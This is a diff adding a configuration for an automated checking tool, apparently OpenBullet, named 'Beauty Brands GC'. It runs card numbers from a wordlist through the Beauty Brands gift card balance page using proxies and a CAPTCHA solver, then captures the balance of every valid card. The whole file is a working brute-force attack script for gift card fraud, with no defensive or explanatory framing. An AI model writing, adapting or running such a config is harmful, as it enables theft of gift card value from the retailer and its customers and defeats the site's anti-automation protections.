@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "Beauty Brands GC",
+  "SuggestedBots": 10,
+  "LastModified": "2018-06-29T13:42:23.8178836+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 726311914
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.beautybrands.com/giftcardbalancelookup.do?method=submit&balance=true" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "JSESSIONID=: 327D335EF8C3F1F95814C8C71FC79559.b2c-beautybrands-prdv161-app001; path=/; HttpOnly" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://www.beautybrands.com/giftcardbalancelookup.do?method=submit&balance=true" "6Le4rCMUAAAAAAA_ApgnXj8TSvrBfa8S2H8zLexr" -> VAR "RECAP" 
+REQUEST POST "https://www.beautybrands.com/giftcardbalancelookup.do?method=submit&balance=true" AutoRedirect=TRUE 
+  CONTENT "giftCardNumber=<USER>&g-recaptcha-response=<RECAP>&gift-card-balance-submit=Submit" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "JSESSIONID=: " 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The gift card number you have entered doesn't exist. Recheck the number you have entered and try again." 
+  KEYCHAIN Success OR 
+    KEY "Your balance is:" 
+PARSE "<SOURCE>" LR "Your balance is:&nbsp;" "</div>" Recursive=FALSE -> CAP "BALANCE" "" "" 
